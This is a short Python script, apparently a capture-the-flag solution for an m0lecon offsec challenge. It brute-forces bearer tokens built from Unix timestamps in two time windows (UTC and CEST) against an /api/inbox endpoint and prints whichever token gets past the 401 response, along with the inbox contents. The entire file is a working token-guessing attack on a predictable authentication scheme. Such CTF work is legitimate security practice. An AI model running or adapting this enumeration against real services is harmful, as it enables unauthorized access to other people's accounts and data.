import requests

url = "http://566d501c-921a-4a17-94c1-2536ebe7d0e5.offsec.m0lecon.it:8001/api/inbox"

ranges = [
    range(1775827400, 1775827700),  # UTC
    range(1775820200, 1775820600),  # CEST converted
]

for r in ranges:
    for ts in r:
        token = f"{ts}001"
        
        headers = {
            "Authorization": f"Bearer {token}"
        }
        
        res = requests.get(url, headers=headers)
        
        if res.status_code != 401:
            print(f"[+] FOUND: {token}")
            print(res.text)
            exit()
